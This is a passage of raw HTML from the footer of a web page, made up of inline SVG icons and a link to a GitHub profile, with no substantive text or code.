style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg><span class="new-window"><svg height="8" style="enable-background:new 0 0 1000 1000" viewBox="0 0 1e3 1e3" width="8" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M598 128h298v298h-86V274L392 692l-60-60 418-418H598v-86zM810 810V512h86v298c0 46-40 86-86 86H214c-48 0-86-40-86-86V214c0-46 38-86 86-86h298v86H214v596h596z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg></span></a><a href="https://github.com/7Rocky" target="_blank" class="link-transition github link dib z-999 pt3 pt0-l mr1" title="GitHub link" rel="noopener" aria-label="follow on GitHub——Opens in a new window"><svg height="30" style="enable-background:new 0 0 512 512" viewBox="0 0 512 512" width="30" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M256 32C132.3 32 32 134.8 32 261.7c0 101.5 64.2 187.5 153.2 217.9 11.2 2.1 15.3-5 15.3-11.1.0-5.5-.2-19.9-.3-39.1-62.3 13.9-75.5-30.8-75.5-30.8-10.2-26.5-24.9-33.6-24.9-33.6-20.3-14.3 1.5-14 1.5-14 22.5 1.6 34.3 23.7 34.3 23.7 20 35.1 52.4 25 65.2 19.1 2-14.8 7.8-25 14.2-30.7-49.7-5.8-102-25.5-102-113.5.0-25.1 8.7-45.6 23-61.6-2.3-5.8-10-29.2 2.2-60.8.0.0 18.8-6.2 61.6 23.5 17.9-5.1 37-7.6 56.1-7.7 19 .1 38.2 2.6 56.1 7.7 42.8-29.7 61.5-23.5 61.5-23.5 12.2 31.6 4.5 55 2.2 60.8 14.3 16.1 23 36.6 23 61.6.0 88.2-52.4 107.6-102.3 113.3 8 7.1 15.2 21.1 15.2 42.5.0 30.7-.3 55.5-.3 63 0 6.1 4 13.3 15.4 11C415.9 449.1 480 363.1 480 261.7 480 134.8 379.7 32 256 32z"/></svg><span class="new-window"><svg height="8" style="enable-background:new 0 0 1000 1000" viewBox="0 0 1e3 1e3" width="8" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M598 128h298v298h-86V274L392 692l-60-60 418-418H598v-86zM810 810V512h86v298c0 46-40 86-86 86H214c-48 0-86-40-86-86V214c0-46 38-86 86-86h298v86H214v596h596z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg></span></a></div></div></div></div></footer></body></html>